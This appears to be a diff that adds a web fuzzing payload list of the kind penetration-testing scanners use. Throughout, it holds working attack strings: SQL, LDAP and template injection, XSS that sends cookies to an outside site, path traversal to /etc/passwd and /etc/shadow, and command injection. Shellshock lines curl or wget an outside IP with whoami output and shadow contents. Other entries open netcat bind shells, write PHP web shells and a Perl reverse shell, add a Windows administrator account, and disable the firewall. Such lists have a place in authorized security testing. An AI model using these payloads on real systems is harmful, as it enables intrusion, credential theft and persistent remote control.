@@ -1,0 +1,1110 @@
+
+!
+!'
+"
+"'
+#
+#'
+%
+&
+& 
+&&
+&& 
+'
+' --
+' ;
+'"
+(
+(')
+)
+*
+*'
+*/*
+*|
+-
+--
+--';
+../
+..\
+/
+/'
+/.../.../.../.../.../
+//
+//*
+;
+; 
+;;
+<
+<<
+<<<
+<>"'%;)(&+
+<?
+= '
+= --
+= ;
+@'
+@*
+[']
+\
+\'
+\\
+\\/
+\\\\*
+\\\\?\\
+^'
+`
+{'}
+|
+| 
+||
+|| 
+}
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+$(`cat /etc/passwd`)
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`dir`)
+;{$_GET["cmd"]}
+$(`ls`)
+$null
+$NULL
+ {${phpinfo()}}
+{${phpinfo()}}
+;${@print(md5(RCEVulnerable))};
+${@print("RCEVulnerable")}
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+{${sleep(10)}}
+ {${sleep(20)}}
+{${sleep(20)}}
+ {${sleep(3)}}
+{${sleep(3)}}
+ {${sleep(hexdec(dechex(20)))}} 
+{${sleep(hexdec(dechex(20)))}} 
+$(`type C:\boot.ini`)
+$;/usr/bin/id
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`whoami`)
+\0
+0
+%00
+%00/
++%00
+/%00/
+\0\0
+\00
+00
+\0\0\0
+\00\00
+\00\00\00
+&#0000060
+&#0000060;
+&& #0000060
+&& #0000060;
+&&#0000060
+&&#0000060;
+&#000060
+&#000060;
+&& #000060
+&& #000060;
+&&#000060
+&&#000060;
+!@#0%^#0##018387@#0^^**(()
+&#00060
+&#00060;
+&& #00060
+&& #00060;
+&&#00060
+&&#00060;
+&#0060
+&#0060;
+&& #0060
+&& #0060;
+&&#0060
+&&#0060;
+%00../../../../../../etc/passwd
+%00/etc/passwd%00
+%00../../../../../../etc/shadow
+%00/etc/shadow%00
+%01%02%03%04%0a%0d%0aADSF
+&#060
+&#060;
+&& #060
+&& #060;
+&&#060
+&&#060;
+%0a
+%0a%0d
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+%0Acat%20/etc/passwd
+%0Aid
+%0a id %0a
+%0Aid%0A
+%0a ping -i 30 127.0.0.1 %0a
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%0d%0aX-Injection-Header:%20AttackValue
+0 or 1=1
+0xfffffff
+-1
+1
+&#10;
+&& #10;
+&&#10;
+-1.0
+1.0
+&#10;&#13;
+&& #10;&#13;
+&&#10;&#13;
+{1} + {1}
+&#13;
+&& #13;
+&&#13;
+&#13;&#10;
+&& #13;&#10;
+&&#13;&#10;
+1;SELECT%20*
+-2
+2
+%20
+%20|
+-20
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20$(sleep%2050)
+%20{${sleep(3)}}
+'%20or%201=1
+%20'sleep%2050'
+%21
+2147483647
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+%2500
+%250a
+..%25%35%63
+..%255c
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+%26
+-268435455
+268435455
+%27%20or%201=1
+%28
+%29
+%2A
+/%2A
+/../../../../../../../../%2A
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%2C
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+%2e%2e%2f
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+..%%35%63
+..%%35c
+%3C
+%3C%3F
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3cscript%3ealert("XSS");%3c/script%3e
+{{4+4}}
+{{4+8}}
+..%5c
+%5C
+%5C/
+%60
+&#60
+&#60;
+&& #60
+&& #60;
+&&#60
+&&#60;
+65536
+%7C
+A
+ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+admin'--
+a);id
+a);id;
+a);id|
+a)|id
+a)|id;
+a;id
+a;id;
+a;id|
+a|id
+a|id|
+a;id\n
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+\";alert('XSS');//
+#&apos;
+&& apos;
+&&apos;
+&apos;
+*&apos;
+/&apos;
+@&apos;
+[&apos;]
+\&apos;
+^&apos;
+{&apos;}
+&& apos;%20OR
+&&apos;%20OR
+&apos;%20OR
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+as
+asc
+a);/usr/bin/id
+a);/usr/bin/id;
+a);/usr/bin/id|
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a;/usr/bin/id
+a;/usr/bin/id;
+a;/usr/bin/id|
+a|/usr/bin/id
+bfilename
+..%bg%qf
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
+/../../../../../../../../bin/id|
+|/bin/ls -al
+|| /bin/ls -al
+||/bin/ls -al
+\"blah
+../../../../../../../../../../../../boot.ini
+../../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/./././././././././././boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+/boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+/../../../../../../../../../../../boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+..%c0%af
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+cat /etc/hosts
+cat /etc/passwd
+C:/boot.ini
+C:\boot.ini
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+char%4039%41%2b%40SELECT
+C:/inetpub/wwwroot/global.asa
+C:\inetpub\wwwroot\global.asa
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+../../../../../../../../conf/server.xml
+count(/child::node())
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
+& curl http://crowdshield.com/.testing/rce.txt
+| curl http://crowdshield.com/.testing/rce.txt
+&& curl https://crowdshield.com/.testing/rce_vuln.txt
+; curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt
+ curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+delete
+desc
+& dir
+&& dir
+&&dir
+; dir
+;; dir
+;;dir
+;dir
+`dir`
+| dir
+|| dir
+|| dir|
+||dir
+||dir|
+|dir
+|dir|
+dir
+& dir C:\
+&& dir C:\
+; dir C:\
+| dir C:\
+dir C:\
+& dir C:\Documents and Settings\*
+&& dir C:\Documents and Settings\*
+; dir C:\Documents and Settings\*
+| dir C:\Documents and Settings\*
+dir C:\Documents and Settings\*
+& dir C:\Users
+&& dir C:\Users
+; dir C:\Users
+| dir C:\Users
+dir C:\Users
+distinct
+;echo%20'<script>alert(1)</script>'
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+& echo "<?php include($_GET['page']); ?>" > rfi.php
+&& echo "<?php include($_GET['page']); ?>" > rfi.php
+; echo "<?php include($_GET['page']); ?>" > rfi.php
+| echo "<?php include($_GET['page'])| ?>" > rfi.php
+echo "<?php include($_GET['page']); ?>" > rfi.php
+& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+; echo "<?php system($_GET['cmd']); ?>" > cmd.php
+| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
+echo "<?php system($_GET['cmd']); ?>" > cmd.php
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
+echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+;echo '<script>alert(1)</script>'
+echo '<script>alert(1)</script>'// XXXXXXXXXXX
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+&& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+| echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+() { :;}; echo vulnerable 10
+/,%ENV,/
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../etc/hosts%00
+../../../../../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/passwd^^
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/./././././././././././etc/passwd
+/etc/passwd
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+../../../../../../../../../../../../etc/passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+/../../../../../../../../../../../etc/passwd%00.html
+/../../../../../../../../../../../etc/passwd%00.jpg
+../../../../../../../../../../../../etc/shadow
+..\..\..\..\..\..\..\..\..\..\etc\shadow
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+/../../../../../../../../../../etc/shadow
+/../../../../../../../../../../etc/shadow^^
+/..\../..\../..\../..\../..\../..\../etc/shadow
+/./././././././././././etc/shadow
+/etc/shadow
+\..\..\..\..\..\..\..\..\..\..\etc\shadow
+../../../../../../../../../../../../etc/shadow%00
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+exec('ls')
+'; exec master..xp_cmdshell
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec sp
+exec('whoami')
+exec('whoami');
+exec xp
+'; exec xp_regread
+FALSE
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{ get_user_file("/etc/passwd") }}
+handler
+having
+hi" or 1=1 --
+hi' or 1=1 --
+hi" or "a"="a
+hi") or ("a"="a
+hi' or 'a'='a
+hi') or ('a'='a
+'hi' or 'x'='x';
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+& id
+&&id
+; id
+;; id;
+;;id;
+;id
+;id;
+;id|
+`id`
+| id
+|| id
+|| id|
+||id
+||id|
+|id
+|id;
+|id|
+id%00
+id%00|
+;id\n
+& ifconfig
+&& ifconfig
+; ifconfig
+| ifconfig
+ifconfig
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=`javascript:alert("'XSS'")`>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+/index.html|id|
+insert
+ipconfig
+& ipconfig /all
+&& ipconfig /all
+; ipconfig /all
+| ipconfig /all
+ipconfig /all
+like
+limit
+../../../../../../../../../../../../localstart.asp
+../../../../../../../../../../../../localstart.asp%00
+|| ls
+||ls
+|ls
+ls
+& ls -l /
+&& ls -l /
+; ls -l /
+| ls -l /
+ls -l /
+;; ls -la
+;;ls -la
+;ls -la
+|| ls -la
+||ls -la
+|ls -la
+& ls -laR /etc
+&& ls -laR /etc
+; ls -laR /etc
+| ls -laR /etc
+& ls -laR /var/www
+&& ls -laR /var/www
+; ls -laR /var/www
+| ls -laR /var/www
+& ls -l /etc/
+&& ls -l /etc/
+; ls -l /etc/
+| ls -l /etc/
+ls -l /etc/
+ls -lh /etc/
+& ls -l /home/*
+&& ls -l /home/*
+; ls -l /home/*
+| ls -l /home/*
+ls -l /home/*
+*; ls -lhtR /var/www/
+& ls -l /tmp
+&& ls -l /tmp
+; ls -l /tmp
+| ls -l /tmp
+ls -l /tmp
+& ls -l /var/www/*
+&& ls -l /var/www/*
+; ls -l /var/www/*
+| ls -l /var/www/*
+ls -l /var/www/*
+&& lt
+&& lt;
+&&lt
+&&lt;
+&lt
+&lt;
+&& LT
+&& LT;
+&&LT
+&&LT;
+&LT
+&LT;
+&& lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&& lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&& lt;&gt;&quot;'%;)(&amp;+
+&&lt;&gt;&quot;'%;)(&amp;+
+&lt;&gt;&quot;'%;)(&amp;+
+&& ltscript&gtalert(document.cookie);&ltscript&gtalert
+&&ltscript&gtalert(document.cookie);&ltscript&gtalert
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+&& ltscript&gtalert(document.cookie);</script>
+&&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);</script>
+*(|(mail=*))
+\n
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+<name>','')); phpinfo(); exit;/*</name>
+\n/bin/ls -al\n
+& nc -lvvp 4444 -e /bin/sh&
+&& nc -lvvp 4444 -e /bin/sh &
+; nc -lvvp 4444 -e /bin/sh;
+| nc -lvvp 4444 -e /bin/sh|
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+nc -lvvp 4448 -e /bin/sh&
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+& net localgroup Administrators hacker /ADD
+&& net localgroup Administrators hacker /ADD
+; net localgroup Administrators hacker /ADD
+| net localgroup Administrators hacker /ADD
+net localgroup Administrators hacker /ADD
+& netsh firewall set opmode disable
+&& netsh firewall set opmode disable
+; netsh firewall set opmode disable
+| netsh firewall set opmode disable
+netsh firewall set opmode disable
+netstat
+;; netstat -a;
+;;netstat -a;
+;netstat -a;
+& netstat -an
+&& netstat -an
+; netstat -an
+| netstat -an
+netstat -an
+& net user hacker Password1 /ADD
+&& net user hacker Password1 /ADD
+; net user hacker Password1 /ADD
+| net user hacker Password1 /ADD
+net user hacker Password1 /ADD
+& net view
+&& net view
+; net view
+| net view
+net view
+\nid;
+\nid|
+\nid\n
+|nid\n
+\nnetstat -a%\n
+null
+NULL
+\n/usr/bin/id;
+\n/usr/bin/id|
+\n/usr/bin/id\n
+*(|(objectclass=*))
+' or ''='
+or
+" or 0=0 #
+" or 0=0 --
+' or 0=0 #
+' or 0=0 --
+or 0=0 #
+or 0=0 --
+"' or 1 --'"
+" or 1=1--
+' or '1'='1'--
+' or 1=1--
+or 1=1--
+" or 1=1 or ""="
+' or 1=1 or ''='
+or%201=1
+or%201=1 --
+" or "a"="a
+") or ("a"="a
+' or a=a--
+') or ('a'='a
+order by
+' or (EXISTS)
+'or select *
